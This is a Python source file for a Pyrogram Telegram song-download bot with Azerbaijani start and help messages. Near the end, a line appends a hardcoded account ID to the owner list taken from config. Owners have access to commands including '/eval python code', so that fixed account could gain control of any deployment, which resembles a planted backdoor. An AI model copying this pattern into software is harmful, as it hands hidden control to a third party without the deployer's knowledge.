from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
👋 𝑺𝑨𝑳𝑨𝑴 [{}](tg://user?id={}),

\n\nMən sənin istədiyin mahnını yükləyə bilərəm[🎶](https://telegra.ph/Tyn-09-03)

Sahibimlə əlaqə @ABISHOV_27 🤖

𝙉𝙙𝙞 𝙞𝙨𝙩𝙚𝙙𝙞𝙮𝙞𝙣 𝙢𝙖𝙝𝙣𝜾𝙣𝜾 𝙢e𝙣𝙚 𝙖𝙨̧𝙖𝙜̆𝜾𝙙𝙖𝙠𝜾 𝙣𝙜̆𝙢𝙪𝙣𝙚𝙮𝙚 𝙪𝙮𝙜̆𝙪𝙣 𝙜𝙤̈𝙣𝙙𝙚𝙧... 😍🥰🤗

𝘕𝘶̈𝘮𝘶𝘯𝘦. ```/𝙨𝙤𝙣𝙜 İfrat Heyif```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="Qrupumuz 👬", url="http://t.me/darkchatgroup12"),
             InlineKeyboardButton(
                        text="Botu Qrupa Əlavə Et 🤗", url="http://t.me/SongProBot?startgroup=true"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "Mahnı adını nümunədəki kimi göndər... 😍🥰🤗\n Nümunə: /song İfrat Heyif "
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("SongPlayRoBot Is Now Working🤗🤗🤗")
idle()
